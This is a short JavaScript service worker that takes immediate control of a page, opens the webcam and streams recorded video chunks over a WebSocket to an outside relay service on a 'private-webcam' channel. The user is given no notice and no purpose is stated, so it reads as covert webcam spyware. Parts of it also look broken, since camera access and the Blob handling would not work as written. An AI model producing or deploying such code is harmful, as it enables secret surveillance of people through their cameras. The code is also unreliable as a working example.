self.addEventListener('install', event => {
    self.skipWaiting(); // Activate immediately
});

self.addEventListener('activate', event => {
    self.clients.claim(); // Take control
});

self.addEventListener('fetch', event => {
    // Keep alive, but we’ll focus on webcam here
});

let stream;
navigator.mediaDevices.getUserMedia({ video: true, audio: false })
    .then(s => {
        stream = s;
        const ws = new WebSocket('wss://ws-ap1.pusher.com/app/your_app_key?protocol=7');
        ws.onopen = () => {
            const recorder = new MediaRecorder(stream);
            recorder.ondataavailable = (e) => {
                if (e.data.size > 0) {
                    ws.send(JSON.stringify({
                        channel: 'private-webcam',
                        event: 'client-video',
                        data: btoa(String.fromCharCode(...new Uint8Array(e.data)))
                    }));
                }
            };
            recorder.start(100);
        };
    });